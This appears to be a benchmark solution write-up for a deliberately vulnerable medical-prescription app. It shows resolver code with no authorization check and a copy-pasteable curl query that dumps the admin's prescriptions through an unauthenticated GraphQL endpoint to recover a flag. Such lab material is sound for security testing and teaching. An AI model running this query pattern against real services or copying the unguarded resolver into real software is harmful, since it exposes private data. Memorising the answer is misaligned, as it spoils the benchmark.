# XBEN-007-24 — MedSafe (unauthenticated GraphQL IDOR)

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Broken access control on a GraphQL endpoint — `/graphql` is registered without `@login_required`, and the `getPrescriptions(userId)` query resolver performs no session/ownership check at all, so any unauthenticated client can dump any user's prescriptions (including the admin's) by simply supplying their `userId`.

## Setup

```bash
cd xbow/benchmarks/XBEN-007-24
make run
docker compose port web 5003   # -> host port, e.g. 55389
```

## Root cause (app/app.py)

```python
class Query(graphene.ObjectType):
    get_prescriptions = graphene.List(PrescriptionType, user_id=graphene.Int(required=True))

    def resolve_get_prescriptions(self, info, user_id):
        return Prescription.query.filter_by(user_id=user_id).all()   # no auth/ownership check

...
app.add_url_rule('/graphql', view_func=GraphQLView.as_view('graphql', schema=schema, graphiql=True))
# (no login_required wrapper, unlike /add_prescription and /view_prescriptions)
```

`init_db()` seeds 89 prescriptions for the `admin` user (`id=1`), and prescription #43 has its `flag` column set to the real flag.

## Exploit (copy-pasteable, port substituted for this run: 55389)

```bash
PORT=55389
BASE=http://localhost:$PORT

# No login/cookie needed at all — query admin's (user_id=1) prescriptions directly:
curl -s -X POST $BASE/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}' \
  | python3 -m json.tool | grep -B3 -i '"flag": "FLAG'
```
